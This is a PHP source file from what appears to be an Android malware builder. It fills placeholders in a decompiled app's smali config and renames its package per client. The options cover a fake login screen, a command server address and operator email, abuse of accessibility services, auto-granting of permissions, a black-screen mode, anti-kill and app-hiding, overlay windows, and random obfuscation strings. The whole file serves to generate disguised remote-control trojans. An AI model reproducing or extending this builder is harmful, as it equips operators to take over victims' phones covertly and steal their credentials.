<?php

namespace ApkBuilder;

/**
 * Smali 文件处理器
 * 
 * 占位符映射参考 C# Worker.cs Step3() 函数
 */
class SmaliProcessor
{
    private string $buildDir;
    private string $obfuscationString = '';

    public function __construct(string $buildDir)
    {
        $this->buildDir = $buildDir;
        // 生成混淆字符串，与 C# 的 NEWRANDOM = Codes.madladstr() 对应
        $this->obfuscationString = $this->generateObfuscationString();
    }

    /**
     * 生成混淆字符串
     * 对应 C# 的 Codes.madladstr()
     */
    private function generateObfuscationString(): string
    {
        $chars = 'qazwsxedcrfvtgbyhnujmikolp';
        $length = rand(8, 16);
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $result;
    }

    /**
     * 修改 Smali 配置文件
     * 
     * 占位符映射修复说明（对比 C# Worker.cs）：
     * - [USE-AUTOGRANT] -> useAtoprims (自动授权提示文字)，不是 loginTitle
     * - [USE-BLACK] -> userBlackprims (黑屏权限开关)，不是 noEmulator
     * - [USE-HIDDEEN] -> hiddenApp (隐藏应用开关)
     * - [log-title] -> loginTitle (登录标题)
     * - [OBFS] -> 随机混淆字符串
     */
    public function modifyConfig(ApkBuildConfig $config, string $assetsKey, Encryptor $encryptor): void
    {
        $smaliPath = $this->buildDir . '/smali/com/icontrol/protector/My_Configs.smali';
        if (!file_exists($smaliPath)) {
            throw new \Exception("My_Configs.smali not found");
        }

        $content = file_get_contents($smaliPath);
        // 使用独立的 useWss 配置，不再依赖 appurl 判断
        $useWss = $config->useWss;

        // 占位符映射表 - 严格按照 C# Worker.cs Step3() 实现
        $replacements = [
            // 客户端标识
            '[Client_N]' => $config->clientname,
            
            // 通知配置
            '[_NOTIFI_TITLE_]' => $config->notifyTitle,
            '[_NOTIFI_MSG_]' => $config->notifyMsg,
            
            // 登录界面配置
            '[log-title]' => $config->loginTitle,      // 登录标题 (C#: logintitle)
            '[log-dis]' => $config->loginDis,          // 登录描述 (C#: logindis)
            '[log-btn]' => $config->loginBtn,          // 登录按钮 (C#: loginbtn)
            '[log-lng]' => $config->lngShort,          // 引导文字 (C#: lngshort)
            
            // 服务器配置
            '[USER_DOM]' => $config->UserHost,
            '[USER_MAIL]' => $encryptor->encryptString($config->email),
            '[BSE_URL]' => $encryptor->encryptString($config->appurl),
            
            // 功能开关 - 修复映射错误
            '[USE-AUTOGRANT]' => $config->useAtoprims,   // ✅ 修复：自动授权提示 (C#: use_atoprims)
            '[USE-SUPER]' => $config->useAccess,         // 无障碍服务 (C#: use_access)
            '[USE-ALLPRIM]' => $config->userAllprims,    // 请求所有权限 (C#: ASKPRIM_all)
            '[USE-BLACK]' => $config->userBlackprims,    // ✅ 修复：黑屏权限 (C#: ASKPRIM_black)
            '[USE-NOKILL]' => $config->useAntkill,       // 防杀进程 (C#: use_antkill)
            '[USE-HIDDEEN]' => $config->hiddenApp,       // ✅ 新增：隐藏应用 (C#: hiddenapp)
            '[USE-FAKE]' => $config->hideType,           // 隐藏类型 (C#: hidetype)
            '[USE-DRAWOVER]' => $config->useDraw,        // 悬浮窗 (C#: use_draw)
            '[USE-OOENACC]' => $config->openAccess,      // 自动打开无障碍 (C#: open_access)
            '[USE-DIAO]' => $config->diaoType,           // 弹窗锁定 (C#: diao_type)
            '[USE-GUID]' => $config->installType,        // 安装引导类型 (C#: installtype)
            '[USE-STORE]' => ($config->buildType === 'S') ? '1' : '0',  // 商店模式
            '[USE-CAPLOCK]' => '0',                      // 截屏锁定（固定值）
            
            // 加密和混淆
            '[AST-PAS]' => $assetsKey,                   // Assets 加密密钥
            '[OBFS]' => $this->obfuscationString,        // ✅ 新增：混淆字符串 (C#: NEWRANDOM)
        ];

        foreach ($replacements as $search => $replace) {
            $content = str_replace($search, $replace, $content);
        }

        if (!$useWss) {
            $content = str_replace('const-string v1, "wss://"', 'const-string v1, "ws://"', $content);
        }

        file_put_contents($smaliPath, $content);
    }

    /**
     * 重命名包名
     */
    public function renamePackage(string $oldPackage, string $newPackage): void
    {
        $oldPath = str_replace('.', '/', $oldPackage);
        $newPath = str_replace('.', '/', $newPackage);
        $smaliDirs = ['smali', 'smali_classes2', 'smali_classes3', 'smali_classes4', 
                      'smali_classes5', 'smali_classes6', 'smali_classes7'];

        foreach ($smaliDirs as $smaliDir) {
            $basePath = $this->buildDir . '/' . $smaliDir;
            if (!is_dir($basePath)) continue;

            $oldDir = $basePath . '/' . $oldPath;
            $newDir = $basePath . '/' . $newPath;

            if (is_dir($oldDir)) {
                @mkdir(dirname($newDir), 0755, true);
                $this->moveDirectory($oldDir, $newDir);
                $this->replaceReferences($newDir, $oldPackage, $newPackage);
            }
            $this->replaceReferences($basePath, $oldPackage, $newPackage);
        }
    }

    /**
     * 移动目录
     */
    private function moveDirectory(string $src, string $dst): void
    {
        if (!@rename($src, $dst)) {
            $this->copyDir($src, $dst);
            $this->deleteDir($src);
        }
    }

    /**
     * 替换 Smali 文件中的引用
     */
    private function replaceReferences(string $dir, string $oldPackage, string $newPackage): void
    {
        $oldSmali = 'L' . str_replace('.', '/', $oldPackage);
        $newSmali = 'L' . str_replace('.', '/', $newPackage);

        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS)
        );

        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'smali') {
                $content = file_get_contents($file->getPathname());
                $content = str_replace([$oldSmali, $oldPackage], [$newSmali, $newPackage], $content);
                file_put_contents($file->getPathname(), $content);
            }
        }
    }

    /**
     * 复制目录
     */
    private function copyDir(string $src, string $dst): void
    {
        @mkdir($dst, 0755, true);
        foreach (scandir($src) as $file) {
            if ($file === '.' || $file === '..') continue;
            $srcPath = "$src/$file";
            $dstPath = "$dst/$file";
            is_dir($srcPath) ? $this->copyDir($srcPath, $dstPath) : copy($srcPath, $dstPath);
        }
    }

    /**
     * 删除目录
     */
    private function deleteDir(string $dir): void
    {
        if (!is_dir($dir)) return;
        foreach (array_diff(scandir($dir), ['.', '..']) as $file) {
            $path = "$dir/$file";
            is_dir($path) ? $this->deleteDir($path) : unlink($path);
        }
        rmdir($dir);
    }
}
